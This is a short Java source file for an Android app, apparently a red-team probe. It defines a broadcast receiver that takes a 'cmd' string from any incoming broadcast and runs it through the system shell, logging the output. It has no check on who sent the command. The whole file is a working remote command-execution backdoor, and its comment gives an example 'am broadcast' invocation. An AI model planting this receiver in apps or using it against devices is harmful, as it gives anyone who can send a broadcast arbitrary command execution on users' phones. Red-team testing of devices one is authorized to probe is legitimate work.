package com.redteam.probe;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import java.io.*;

/**
 * Execute arbitrary commands via broadcast:
 * am broadcast -a com.redteam.probe.COMMAND --es cmd "id"
 */
public class CommandReceiver extends BroadcastReceiver {
    private static final String TAG = "RedTeamProbe";

    @Override
    public void onReceive(Context context, Intent intent) {
        String cmd = intent.getStringExtra("cmd");
        if (cmd == null) return;
        
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String line;
            while ((line = br.readLine()) != null) Log.i(TAG, "CMD_OUT: " + line);
            while ((line = er.readLine()) != null) Log.i(TAG, "CMD_ERR: " + line);
            p.waitFor();
            Log.i(TAG, "CMD_EXIT: " + p.exitValue());
        } catch (Exception e) {
            Log.e(TAG, "CMD_FAIL: " + e.getMessage());
        }
    }
}
